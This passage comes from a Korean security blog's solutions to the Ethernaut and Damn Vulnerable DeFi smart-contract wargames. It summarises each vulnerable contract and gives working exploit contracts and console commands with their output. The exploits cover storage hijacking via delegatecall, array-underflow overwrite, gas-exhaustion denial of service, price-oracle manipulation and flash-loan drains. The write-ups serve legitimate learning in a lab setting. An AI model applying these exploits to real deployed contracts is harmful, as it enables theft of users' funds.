값을 player 주소로 변경해야 한다.\nExploit delegatecall()로 인해, caller인 Preservation() 컨트랙트의 storage 영역이 변경된다.\n 개발자의 의도는 각 함수/인자 전달을 통해 callee인 LibraryContract 컨트랙트의 uint storedTime을 변경하는 것  (1) [slot 0] address public timeZone1Library 변경\n 첫번째 setFirstTime() 호출 시, LibraryContract::storedTime(slot 0)가 아닌 Preservation::timeZone1Library(slot 0)이 변경된다. 이 때 공격자가 개발한 컨트랙트의 주소를 전달하여, 이후 setFirstTime()을 통해 호출되는 delegatecall()을 공격자의 컨트랙트로 보낼 수 있다.  (2) [slot 2] address public owner 변경\n 두번째 setFirstTime() 호출 시, delegatecall()로 공격자가 개발한 컨트랙트의 setTime()을 호출하게 된다. 공격자 컨트랙트의 setTime()은 Preservation::owner(slot 2)를 변경하는 코드로 구성하면 된다.  // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IPreservation { function setFirstTime(uint _timeStamp) external; } contract LibraryContractHook { address slot0; address slot1; address slot2_owner; function setTime(uint _time) public { //owner = address(_time);  slot2_owner = address(uint160(_time)); } } contract PreservationExploit { address target; LibraryContractHook hookLibrary; address attackerEOA; constructor (address _preservation) public { target = _preservation; hookLibrary = new LibraryContractHook(); attackerEOA = msg.sender; } // run twice?  function exploit() public { IPreservation(target).setFirstTime(uint256(address(hookLibrary))); IPreservation(target).setFirstTime(uint256(attackerEOA)); } } \u0026gt; await contract.timeZone1Library(); \u0026#39;0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5\u0026#39; \u0026gt; await contract.timeZone2Library(); \u0026#39;0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1\u0026#39; \u0026gt; await contract.owner(); \u0026#39;0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F\u0026#39; // LibraryContractHook Deploy  // PreservationExploit Deploy \u0026amp; call exploit()  await contract.timeZone1Library(); \u0026#39;0x67FeC8C9Ae98D7cfeeD4ef05F3E7c3A432AB59Ed\u0026#39; await contract.timeZone2Library(); \u0026#39;0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1\u0026#39; await contract.owner(); \u0026#39;0x--------------AttackerEOA---------------\u0026#39; // Submit  # 17. Recovery Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Recovery { //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.sender, _initialSupply); } } contract SimpleToken { using SafeMath for uint256; // public variables  string public name; mapping (address =\u0026gt; uint) public balances; // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) public { name = _name; balances[_creator] = _initialSupply; } // collect ether in return for tokens  receive() external payable { balances[msg.sender] = msg.value.mul(10); } // allow transfers of tokens  function transfer(address _to, uint _amount) public { require(balances[msg.sender] \u0026gt;= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; } // clean up after ourselves  function destroy(address payable _to) public { selfdestruct(_to); } } Recovery 컨트랙트는 SimpleToken 컨트랙트를 이용해 토큰을 생성했고, 해당 SimpleToken 컨트랙트는 receive() 함수를 통해 받은 ether * 10의 토큰을 반환해준다.\n배포자는 SimpleToken에 0.001 ether를 보낸 후, 해당 컨트랙트의 주소를 잃어버린 상황이다.\n이 상황에서 해당 주소로부터 0.001 ether를 찾아와야 한다.\nExploit Get new instance를 통해 배포한 Recovery 컨트랙트를 Rinkeby Etherscan에서 검색한다.\n해당 컨트랙트의 Internal Txns의 탭 내용 중 To가 Contract Creation인 Txn을 확인할 수 있다.\nContract Creation을 클릭하면, Recovery 컨트랙트에 의해 생성된 SimpleToken 컨트랙트를 확인할 수 있다.\nSimpleToken의 Internal Txns를 보면, 해당 컨트랙트로 0.001 ether가 송신된 Txn을 찾을 수 있다. (이 때 From은 Ethernaut의 Level Address)\n이후 아래와 같이, 대상 컨트랙트에 트랜잭션을 전송하여 destroy() 함수를 호출하면 된다.\n selfdestruct(_to)를 통해 컨트랙트 destruct 후, 컨트랙트가 가진 잔고는 인자로 전달된 _to 로 전송  \u0026gt; let simpletoken = \u0026#34;[SimpleToken Contract Address]\u0026#34;; \u0026gt; await getBalance(simpletoken); \u0026#39;0.001\u0026#39; \u0026gt; let payload = web3.eth.abi.encodeFunctionCall({ name: \u0026#39;destroy\u0026#39;, type: \u0026#39;function\u0026#39;, inputs: [{ type: \u0026#39;address\u0026#39;, name: \u0026#39;_to\u0026#39; }] }, [player]); \u0026#39;0x00f55d9d000000000000000000000000446e7871f0be73127feebdb959d49864043ef525\u0026#39; \u0026gt; await sendTransaction({from: player, to:simpletoken, data: payload}) \u0026gt; await getBalance(simpletoken); \u0026#39;0\u0026#39; // Submit  # 18. Magic Number WIP\n # 19. Alien Codex Summary // SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import \u0026#39;../helpers/Ownable-05.sol\u0026#39;; contract AlienCodex is Ownable { bool public contact; bytes32[] public codex; modifier contacted() { assert(contact); _; } function make_contact() public { contact = true; } function record(bytes32 _content) contacted public { codex.push(_content); } function retract() contacted public { codex.length--; } function revise(uint i, bytes32 _content) contacted public { codex[i] = _content; } } // Ownable-5.sol pragma solidity ^0.5.0; /** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be aplied to your functions to restrict their use to * the owner. */ contract Ownable { address private _owner; ... AlienCodex 컨트랙트의 ownership을 획득해야 한다.\n해당 컨트랙트는 Ownable 컨트랙트를 상속하고 있어, 다음과 같은 스토리지(슬롯) 레이아웃을 갖게된다.\n\u0026gt; await web3.eth.getStorageAt(contract.address, 0) // slot0[0:20] Ownable::_owner (address) -\u0026gt; da5b3fb76c78b6edee6be8f11a1c31ecfb02b272  // slot0[20:21] : Ownable::contact (bool) -\u0026gt; false 0 \u0026#39;0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272\u0026#39; \u0026gt; await contract.make_contact(); \u0026gt; await web3.eth.getStorageAt(contract.address, 0) // slot0[0:20] Ownable::_owner (address) -\u0026gt; da5b3fb76c78b6edee6be8f11a1c31ecfb02b272  // slot0[20:21] : Ownable::contact (bool) -\u0026gt; true 1 \u0026#39;0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272\u0026#39; \u0026gt; await web3.eth.getStorageAt(contract.address, 1) // length of AlienCodex::codex (uint256) \u0026#39;0x0000000000000000000000000000000000000000000000000000000000000000\u0026#39; 컨트랙트의 스토리지 영역은 2**256 개의 슬롯을 가지고 있으며, 각 슬롯은 32 바이트 크기를 가진다.\nAlienCodex::retract() 및 AlienCodex::revise() 함수에 의해, 취약점이 발생\n  (1) AlienCodex::retract() 를 호출 시, length of AlienCodex::codex에 Integer Underflow가 발생하여 length가 2**256 - 1로 변경되어 모든 Slot이 할당된 것으로 인식\n  (2) AlienCodex::revise()를 이용해 모든 슬롯에 접근 및 Write 가능\n  Exploit retract() 기반의 Integer Underflow를 통해, Dynamic Bytes32 Array의 크기값 변경(0 -\u0026gt; 0xffffff\u0026hellip;)\n\u0026gt; await web3.eth.getStorageAt(contract.address, 1) \u0026#39;0x0000000000000000000000000000000000000000000000000000000000000000\u0026#39; \u0026gt; await contract.retract() \u0026gt; await web3.eth.getStorageAt(contract.address, 1) \u0026#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\u0026#39; bytes32[] codex의 첫 슬롯 인덱스 주소를 통해, Slot 0의 상대적인 인덱스 획득\n\u0026gt; web3.utils.keccak256(web3.utils.padLeft(\u0026#39;0x1\u0026#39;, 64)) \u0026#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\u0026#39; \u0026gt; let arr_0 = web3.utils.toBN(web3.utils.keccak256(web3.utils.padLeft(\u0026#39;0x1\u0026#39;, 64))) \u0026gt; let end_of_slot = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)).sub(arr_0) \u0026gt; let slot_0 = end_of_slot.add(web3.utils.toBN(1)) Slot 0 영역에 원하는 값(Player EOA) Overwrite\n\u0026gt; let attackerBytes32 = web3.utils.padLeft(player, 64); \u0026gt; attackerBytes32 \u0026#39;0x000000000000000000000000--------------AttackerEOA---------------\u0026#39; \u0026gt; await contract.revise(slot_0, attackerBytes32); \u0026gt; await web3.eth.getStorageAt(contract.address, 0) \u0026#39;0x000000000000000000000000--------------AttackerEOA---------------\u0026#39; // Submit  # 20. Deinal Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Denial { using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw  address payable public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =\u0026gt; uint) withdrawPartnerBalances; // keep track of partners balances  function setWithdrawPartner(address _partner) public { partner = _partner; } // withdraw 1% to recipient and 1% to owner  function withdraw() public { uint amountToSend = address(this).balance.div(100); // perform a call without checking return  // The recipient can revert, the owner will still get their share  partner.call{value:amountToSend}(\u0026#34;\u0026#34;); owner.transfer(amountToSend); // keep track of last withdrawal time  timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); } // allow deposit of funds  receive() external payable {} // convenience function  function contractBalance() public view returns (uint) { return address(this).balance; } } 시간이 지남에 따라 천천히 자금을 인출해주는 Denial 컨트랙트를 대상으로, owner가 자금을 출금하지 못하도록 해야 한다.\nwithdraw() 함수의 partner.call{value:amountToSend}(\u0026quot;\u0026quot;); 구문 이후에 수행되는 owner.transfer(amountToSend); 구문이 제대로 동작하지 않도록 만들어야 한다.\nwithdraw() 함수는 컨트랙트의 전체 잔고 중 1%에 해당하는 금액을 파트너와 owner에게 전송하며, 공격자는 setWithdrawPartner()를 통해 출금 파트너로 등록할 수 있다.\nsolidity에서 ether를 송신하는 방법\n transfer : gas 2300 소모 / 실패 시 error throwing send : gas 2300 소모 / 결과로 true,false 반환 call : 인자로 설정된 gas나 전달된 gas를 모두 전달 / 결과로 true,false 반환  solidity에서 Error 처리 방법\n require : 실행 전에 입력이나 조건을 검증할 때 사용 / 가스비 환불 O revert : require와 유사 / 가스비 환불 X assert : 절대 false가 되서는 안되는 코드를 체크할 때 사용 / 가스비 환불 X  Exploit __partner.call{value:amountToSend}(\u0026quot;\u0026quot;); 구문에서 가스비를 모두 소모하게 하여, owner.transfer(amountToSend); 구문에 out of gas 에러가 발생하도록 하여 출금을 막을 수 있다.\n파트너로 지정된 공격자 컨트랙트에서 가스비를 소모할 수 있는 방법은 다음과 같이 두가지가 있다.\n (1) assert(false) 사용 (2) 가스비가 모두 소모될때까지 무한루프 실행  // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract DenialExploit { receive() external payable { // assert(false);  // or  for(;;){} } } \u0026gt; await contract.setWithdrawPartner(\u0026#34;[Exploit Contract Address]\u0026#34;) // Submit  # 21. Shop Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) { // check  isSold = true; // isSold \u0026lt;- true  price = _buyer.price(); // set  } } } 공격자는 isSold 값을 true로 만들고, price도 100보다 낮게 설정하는 것이 목표이다.\n_buyer.price()와 같이 인터페이스를 사용하는데, 받아온 값을 변수 등에 저장하지 않고 재호출하기 때문에 취약점이 발생한다.\nExploit  if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) -\u0026gt; isSold가 false 이고, 인터페이스를 통해 받아온 값이 현재 price(100)이상인 경우 조건 통과 isSold = true; -\u0026gt; isSold를 true로 변경 price = _buyer.price(); -\u0026gt; 인터페이스를 통해 값을 다시 받아와 price 값을 재설정  isSold true / false 여부에 따라 인터페이스에서 값을 다르게 전송해주면 된다!\nisSold가 false일 때는, 조건문 통과를 위해 초기 price값인 100 반환\nisSold가 true일 때는, 조건문 통과 후 price를 새로 설정하는 상황이기 때문에 0 반환\n// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IShop { function buy() external; function price() external view returns (uint); function isSold() external view returns (bool); } contract ShopExploit { address target; constructor (address _target) public { target = _target; } function price() public view returns (uint) { return IShop(target).isSold() ? 0 : 100; } function exploit() public { IShop(target).buy(); } } // ShopExploit Contract Deploy  // exploit()  \u0026gt; await contract.price() 0 \u0026gt; await contract.isSold() true // Submit  # 22. Dex Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Dex { using SafeMath for uint; address public token1; address public token2; constructor(address _token1, address _token2) public { token1 = _token1; token2 = _token2; } function swap(address from, address to, uint amount) public { require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026#34;Invalid tokens\u0026#34;); require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); uint swap_amount = get_swap_price(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swap_amount); IERC20(to).transferFrom(address(this), msg.sender, swap_amount); } function add_liquidity(address token_address, uint amount) public{ IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } function approve(address spender, uint amount) public { SwappableToken(token1).approve(spender, amount); SwappableToken(token2).approve(spender, amount); } function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account); } } contract SwappableToken is ERC20 { constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) { _mint(msg.sender, initialSupply); } } Dex 컨트랙트는 두 개의 토큰(token1, token2) 스왑 기능을 지원하며 각 토큰을 100개씩 가지고 있으며, 공격자는 각 토큰을 10개씩 가지고 있다.\n이 상황에서 Dex에 있는 두 토큰 중 1개라도 모두 공격자가 가져오는 것이 목표이다.\nDex::get_swap_price()에 의해 CPMM 기반의 Price Oracle을 지원하고 있으며, 충분한 유동성이 제공되지 않는 경우 Price Manipulation이 가능하다.\nExploit \u0026gt; let token1 = await contract.token1() \u0026gt; let token2 = await contract.token2() // A:10 / B:10 -\u0026gt; A:0 / B:20 \u0026gt; let amountOfTokenA = await contract.balanceOf(token1, player) \u0026gt; await contract.approve(contract.address, amountOfTokenA) \u0026gt; await contract.swap(token1, token2, amountOfTokenA) // A:0 / B:20 -\u0026gt; A:24 / B:0 \u0026gt; let amountOfTokenB = await contract.balanceOf(token2, player) \u0026gt; await contract.approve(contract.address, amountOfTokenB) \u0026gt; await contract.swap(token2, token1, amountOfTokenB) // A:24 / B:0 -\u0026gt; A:0 / B:30 \u0026gt; amountOfTokenA = await contract.balanceOf(token1, player) \u0026gt; await contract.approve(contract.address, amountOfTokenA) \u0026gt; await contract.swap(token1, token2, amountOfTokenA) // A:0 / B:30 -\u0026gt; A:41 / B:0 \u0026gt; amountOfTokenB = await contract.balanceOf(token2, player) \u0026gt; await contract.approve(contract.address, amountOfTokenB) \u0026gt; await contract.swap(token2, token1, amountOfTokenB) // A:41 / B:0 -\u0026gt; A:0 / B:65 \u0026gt; amountOfTokenA = await contract.balanceOf(token1, player) \u0026gt; await contract.approve(contract.address, amountOfTokenA) \u0026gt; await contract.swap(token1, token2, amountOfTokenA) // DEX Balance Check \u0026gt; await contract.balanceOf(token1, contract.address) 110 \u0026gt; await contract.balanceOf(token2, contract.address) 45 // Attacker Balance Check \u0026gt; await contract.balanceOf(token1, player) 0 \u0026gt; await contract.balanceOf(token2, player) 65 \u0026gt; await contract.get_swap_price(token2, token1, 45) \u0026gt; 110 // A:0 / B:65 -\u0026gt; A:110 / B:21 \u0026gt; await contract.approve(contract.address, 45) \u0026gt; await contract.swap(token2, token1, 45) // Submit  # 23. Dex Two Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract DexTwo { using SafeMath for uint; address public token1; address public token2; constructor(address _token1, address _token2) public { token1 = _token1; token2 = _token2; } function swap(address from, address to, uint amount) public { require(IERC20(from).balanceOf(msg.sender) \u0026gt;= amount, \u0026#34;Not enough to swap\u0026#34;); uint swap_amount = get_swap_amount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swap_amount); IERC20(to).transferFrom(address(this), msg.sender, swap_amount); } function add_liquidity(address token_address, uint amount) public{ IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function get_swap_amount(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } function approve(address spender, uint amount) public { SwappableTokenTwo(token1).approve(spender, amount); SwappableTokenTwo(token2).approve(spender, amount); } function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account); } } contract SwappableTokenTwo is ERC20 { constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) { _mint(msg.sender, initialSupply); } } 이전 문제와 동일하지만, DexTwo::get_swap_amount()에서 토큰 검증하는 로직이 빠져있다.\n ~require((from == token1 \u0026amp;\u0026amp; to == token2) || (from == token2 \u0026amp;\u0026amp; to == token1), \u0026quot;Invalid tokens\u0026quot;);~  공격자가 만든 임의의 토큰으로 Price Manipulation이 가능하다!\nExploit // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#34;@openzeppelin/contracts/token/ERC20/IERC20.sol\u0026#34;; import \u0026#34;@openzeppelin/contracts/token/ERC20/ERC20.sol\u0026#34;; contract SwappableTokenTwo is ERC20 { constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) { _mint(msg.sender, initialSupply); } } (1) name:Hack / symbol:H / initialSupply:40 을 입력하여 공격자의 토큰 생성 (0xA7019F158f3474ea0943A3005E78592E8B20eaf2)\n(2) 해당 토큰 컨트랙트에서 DexTwo 컨트랙트로 토큰 전송 허가 - approve([DexTwoContract Address], 40)\n\u0026gt; let token1 = await contract.token1() \u0026gt; let token2 = await contract.token2() \u0026gt; await contract.add_liquidity(token3, 10); \u0026gt; await contract.swap(token3, token1, 10); \u0026gt; await contract.swap(token3, token2, 10); // DEX Balance Check \u0026gt; await contract.balanceOf(token1, contract.address) 0 \u0026gt; await contract.balanceOf(token2, contract.address) 0 // Attacker Balance Check \u0026gt; await contract.balanceOf(token1, player) 110 \u0026gt; await contract.balanceOf(token2, player) 110 // Submit ","permalink":"https://inhack.github.io/kr/posts/solution-ethernaut/","summary":"\u003chr\u003e\n\u003cp\u003e\u003ca href=\"https://ethernaut.openzeppelin.com/\"\u003e\u003cstrong\u003e\u003cem\u003e\u0026lsquo;Ethernaut\u0026rsquo;\u003c/em\u003e\u003c/strong\u003e\u003c/a\u003e is a Web3/Solidity based wargame inspired on overthewire.org.\u003c/p\u003e\n\u003cp\u003eThis article offers a brief summary and exploit code of each challenge.\u003c/p\u003e","title":"[Solution] Ethernaut"},{"content":" \u0026lsquo;Damn Vulnerable DeFi\u0026rsquo; is an offensive security playground for decentralized finances.\nThis article offers a brief summary and exploit code of each challenge.\nFor detailed source code and contents, please check my github repository.\n # 1. Unstoppable Summary Flash Loan을 제공하고 있는 Lending Pool을 대상으로 DoS 공격을 통해 기능을 멈추게하는 것이 목표이다.\nFlash Loan?\n Flash Loan은 간단하게 설명하자면 \u0026lsquo;무담보\u0026rsquo; 대출로, 보통 사용자는 대출 풀에 소정의 수수료를 지급하고(물론 트랜잭션 실행에 대한 가스비도 소모) 토큰을 대출할 수 있다.\n대출한 토큰을 가지고 다른 DeFi 서비스에 투자를 하던, 에어드랍 보상을 위한 스테이킹을 하던, 사용자가 상환 이전까지 사용할 수 있다.\n하지만 Flash Loan의 대출-상환 프로세스는 \u0026lsquo;단일\u0026rsquo; 트랜잭션에서 이루어져야 하며, 상환 과정에서 대출받은 토큰만큼의 수량을 Pay Back하지 않는 경우 해당 트랜잭션이 revert된다.\nrevert가 된다는 것은 해당 트랜잭션이 블록에 포함되지 않아 PoW/PoS 등의 거래증명이 완료되지 않기 때문에, State Transition이 발생하지 않는다.\n말이 어려운데 그냥 원금을 돌려놓지 않으면, 대출-상환 사이에 토큰을 옮기든 무엇을 하든 트랜잭션 revert로 인해 대출 실행 이전의 상태로 원복된다는 것이다.(수수료나 가스비만 소모)\n 이더리움에서는 계정(컨트랙트 및 EOA)을 대상으로 강제로 Ether를 송신할 수 있으므로\nuint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore \u0026gt;= borrowAmount, \u0026#34;Not enough tokens in pool\u0026#34;); // Ensured by the protocol via the `depositTokens` function assert(poolBalance == balanceBefore); 와 같이 컨트랙트의 balance를 엄격하게 확인하는 코드를 작성하는 경우에 주의해야 한다.\n위 코드로 인해 Lending Pool의 계좌 잔액이 1 wei만 늘어나더라도, assert()에 의해 이후의 코드가 실행되지 않는 DoS 상태로 빠질 수 있다.\nExploit unstoppable.challenge.js\nawait this.token.connect(attacker).transfer(this.pool.address, 1); // forcibly send 1 wei to lending pool  # 2. Naive receiver Summary Flash Loan을 제공하는 Lending Pool에서 대출 수수료로 1 ETH를 청구한다. 해당 Lending Pool을 이용하는 특정 사용자의 balance(10 ETH)를 drain하는 것이 목표이다.\n// NaiveReceiverLenderPool.sol ... // msg.sender가 borrower인지 검증하는 로직이 없음 -\u0026gt; 공격자가 임의의 사용자의 컨트랙트에 있는 잔고를 고갈시킬 수 있음(수수료 사용) function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant { // (1) Flash Loan 컨트랙트의 잔액이 borrowAmount에 비해 충분한지 확인  uint256 balanceBefore = address(this).balance; require(balanceBefore \u0026gt;= borrowAmount, \u0026#34;Not enough ETH in pool\u0026#34;); // (2) 대출자인 borrower가 컨트랙트인지 확인(not EOA)  require(borrower.isContract(), \u0026#34;Borrower must be a deployed contract\u0026#34;); // borrower.receiveEther() 호출  // Transfer ETH and handle control to receiver  borrower.functionCallWithValue( abi.encodeWithSignature( \u0026#34;receiveEther(uint256)\u0026#34;, FIXED_FEE ), borrowAmount ); require( address(this).balance \u0026gt;= balanceBefore + FIXED_FEE, \u0026#34;Flash loan hasn\u0026#39;t been paid back\u0026#34; ); } ... 위 코드를 보면 확인할 수 있듯이, flashLoan() 을 호출하여 대출을 실행하는 사용자인 msg.sender가 borrower인지 검증하는 로직이 없어, 공격자가 임의의 사용자 주소를 borrower에 입력하여 호출이 가능하다.\nExploit naive-receiver.challenge.js\nfor(let i=0;i\u0026lt;10;i++){ await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther(\u0026#39;0\u0026#39;)); }  # 3. - Truster Summary Flash Loan을 기반으로 DTV 토큰을 무료로 대출해주는 Lending Pool이 있으며, 해당 Lending Pool은 100만개의 DTV 토큰을 가지고 있다. 해당 Lending Pool로부터 모든 DTV 토큰을 공격자의 계정으로 옮기는 것이 목표이다.\n... // functionCall()을 이용하여 target 컨트랙트의 및 특정 함수를 호출하는 코드로 인해, 공격자는 어떠한 함수든 호출이 가능 function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data ) external nonReentrant { uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore \u0026gt;= borrowAmount, \u0026#34;Not enough tokens in pool\u0026#34;); damnValuableToken.transfer(borrower, borrowAmount); target.functionCall(data); // Vulnerable : target 및 data를 이용해 함수 호출 -\u0026gt; 어떠한 함수든 호출이 가능한 상황  uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); require(balanceAfter \u0026gt;= balanceBefore, \u0026#34;Flash loan hasn\u0026#39;t been paid back\u0026#34;); } ... target.functionCall(data); 에 의해 현재 어떠한 함수든 사용자가 호출이 가능한 상황이다.\nrequire(balanceAfter \u0026gt;= balanceBefore, \u0026quot;Flash loan hasn't been paid back\u0026quot;); 구문 우회를 위해, approve() 함수를 호출하도록하여 Lending Pool-\u0026gt;공격자로 토큰 전송을 승인해두고 flashLoan() 호출 이후에 transferFrom()을 이용해 Lending Pool의 모든 토큰을 공격자의 계정으로 가져올 수 있다.\nExploit truster.challenge.js\nconst ABI = [\u0026#34;function approve(address, uint256)\u0026#34;]; const interface = new ethers.utils.Interface(ABI); const payload = interface.encodeFunctionData(\u0026#34;approve\u0026#34;, [attacker.address, TOKENS_IN_POOL.toString()]); await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload); // token.approve() : lending pool -\u0026gt; attacker await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);  # 4. Side entrance Summary 누구나,언제든 ETH를 예치/인출할 수 있는 Lending Pool이 있다.\n해당 Lending Pool은 1,000 ETH의 balance를 가지고 있으며, 프로모션으로 예치된 ETH를 자유롭게 대출할 수 있는 Flash Loan 서비스를 제공하고 있다.\n공격자는 해당 Lending Pool로부터 모든 ETH를 가져와야 한다.\n// SideEntranceLenderPool contract SideEntranceLenderPool { using Address for address payable; mapping (address =\u0026gt; uint256) private balances; // ETH deposit(예치) 기능 제공  // Vulnerable : ETH 수신 여부와 상관없이 balance를 증가시킴  function deposit() external payable { balances[msg.sender] += msg.value; } // ETH withdraw(인출) 기능 제공  function withdraw() external { uint256 amountToWithdraw = balances[msg.sender]; balances[msg.sender] = 0; payable(msg.sender).sendValue(amountToWithdraw); } /** * @notice Flash Loan 기능으로 사용자에게 원하는 만큼의 ETH를 대출 * @param amount 대출할 ETH의 수량 * @dev 대출을 요청한 사용자 컨트랙트의 execute() 함수를 호출 -\u0026gt; execute */ function flashLoan(uint256 amount) external { uint256 balanceBefore = address(this).balance; require(balanceBefore \u0026gt;= amount, \u0026#34;Not enough ETH in balance\u0026#34;); IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); require(address(this).balance \u0026gt;= balanceBefore, \u0026#34;Flash loan hasn\u0026#39;t been paid back\u0026#34;); } } 대출을 요청한 사용자 컨트랙트의 execute() 함수를 실행하며, msg.value를 통해 대출한 ETH 토큰을 전달한다.\ndeposit() 함수는 ETH를 사용자에게 수신했는지 여부와 상관없이 balance를 증가시키도록 취약한 형태로 작성되어 있다.\n공격자는 내부적으로 deposit()을 호출하여 대출한 ETH를 Lending Pool에 예치하는 execute() 함수 및 컨트랙트를 호출한 뒤, flashLoan() 실행이 종료된 이후에 withdraw()를 통해 ETH를 가져올 수 있다.\n (1) flashLoan()을 통해 대출한 ETH를 다시 deposit()하여 공격자의 balances를 증가시킨다.  deposit()이 예치한 사용자의 ETH 전송 여부는 확인하지 않기 때문에, 대출한 토큰으로 balances만 증가시키고 다시 상환   (2) 공격자는 withdraw()를 호출하여 Lending Pool의 ETH를 가져온다.  Exploit attacker-contracts/FlashLoanEtherReceiver.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \u0026#34;../side-entrance/SideEntranceLenderPool.sol\u0026#34;; contract FlashLoanEtherReceiver { SideEntranceLenderPool private immutable pool; address payable private immutable attacker; constructor(address payable poolAddress, address payable attackerAddress) { pool = SideEntranceLenderPool(poolAddress); attacker = attackerAddress; } function execute() external payable { pool.deposit{value: msg.value}(); } function executeFlashLoan() external { // attack -\u0026gt; increase attacker\u0026#39;s balances  pool.flashLoan(address(pool).balance); pool.withdraw(); // send drained ether to attacker  attacker.transfer(address(this).balance); } // Allow deposits of ETH  receive () external payable {} } side-entrance.challenge.js\nconst FlashLoanEtherReceiver = await ethers.getContractFactory(\u0026#39;FlashLoanEtherReceiver\u0026#39;, attacker); this.receiver = await FlashLoanEtherReceiver.deploy(this.pool.address, attacker.address); await this.receiver.executeFlashLoan();  # 5. The rewarder Summary DTV 토큰을 예치한 사용자에게 5일마다 한번씩 리워드 토큰을 보상해주는 Reward Pool이 있다. (라운드마다 100개의 리워드 토큰을 보상하며, 예치한 비율에 따라 분배)\n현재 Alice, Bob, Charile, David 4명이 사용자가 각각 100개의 DTV 토큰을 예치한 상태이며, Reward Round 2에서 각각 25개씩의 Reward를 수령하였다.\n공격자는 DTV 토큰을 하나도 가지고 있지 않은 상태에서, Reward Round 3에서 가장 많은 Reward Token을 수령하는 것이 목표이다.\n100만개의 DTV 토큰을 보유하고 있는 FlashLoanderPool로부터 대출받은 토큰을 Reward Pool에 예치하여 리워드 토큰을 수령하면 된다.\nExploit attacker-contracts/FlashLoanTheRewarder.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; interface IFlashLoanerPool { function flashLoan(uint256 amount) external; } interface IDamnValuableToken { function approve(address spender, uint256 amount) external returns (bool); function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } interface IRewarderPool { function deposit(uint256 amountToDeposit) external; function withdraw(uint256 amountToWithdraw) external; function distributeRewards() external returns (uint256); } interface IRewardToken { function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } contract FlashLoanTheRewarder { using Address for address payable; address payable private lenderPool; //address payable private liquidityToken;  address payable private rewarderPool; address payable private attacker; address payable private rewardToken; address payable private liquidityToken; uint256 public testUint; constructor (address payable _lenderPool, address payable _liquidityToken, address payable _rewardToken, address payable _rewarderPool, address 